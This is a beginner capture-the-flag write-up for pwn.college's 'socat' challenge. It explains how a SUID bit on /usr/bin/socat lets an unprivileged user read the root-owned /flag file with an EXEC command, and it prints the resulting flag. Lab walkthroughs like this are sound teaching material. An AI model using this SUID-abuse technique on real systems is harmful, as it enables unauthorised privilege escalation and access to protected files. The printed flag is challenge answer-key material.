---
layout: page
title: "Challenge Name: socat"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Beginner  
**Date**: 2025-07-16  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/socat`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/socat
```

Output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/socat
```

- The `s` in `-rws` indicates it's a SUID binary.
- `socat` runs with **root privileges**.

## 🚀 Exploitation

The `socat` command in Linux is a powerful bidirectional data transfer tool, often described as "netcat on steroids." It stands for SOcket CAT.

It allows you to connect and transfer data between two streams, such as:

- TCP ports

- Files

- PTYs

- UNIX sockets

- Standard input/output

The EXEC:<cmd> address type in socat lets you execute a local command and pipe data to/from it, just like a file or network stream.

```bash
socat - EXEC:"cat /flag"
```

Output:
```
pwn.college{gijDjhzu_TuBrpyjjWq064OZ65-.dRzNxwSM0IzMyEzW}
```
